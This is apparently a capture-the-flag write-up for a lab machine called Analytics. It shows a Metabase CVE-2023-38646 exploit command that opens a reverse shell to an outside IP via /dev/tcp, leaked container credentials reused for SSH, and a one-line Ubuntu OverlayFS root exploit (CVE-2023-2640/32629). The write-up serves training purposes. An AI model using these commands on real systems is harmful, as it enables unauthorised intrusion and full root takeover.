# Analytics



## Initial access
this machine have subdomain data.analytical.htb and using a Metabase version 0.46.x which vulnerable to CVE-2023-38646 attack
https://secry.me/explore/news/metabase-rce-cve-2023-38646/


### Using metasploit
we can import this exploit/metabase_setup_token_rce.rb to metasploit and getting reverse shell


### Using python script
https://github.com/robotmikhro/CVE-2023-38646

```bash
python3 single.py -u http://data.analytical.htb -c 'whoami'
python3 single.py -u http://data.analytical.htb -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'
```


## Escaping the docker
in the environment we can see information about credential
```bash

$env

MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=1aa340206f20
FC_LANG=en-US
SHLVL=5
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=/bin/sh
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/
MB_DB_FILE=//metabase.db/metabase.db


```
notice the `META_USER` and `META_PASS` we can use this credential for login with ssh and we will have the host machine access


## Privilege Escalation
this machine using Ubuntu 23.04 which vulnerable to CVE-2023-2640 and CVE-2023-32629.
https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

we can automaticly gaining root access with this command below

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'

```
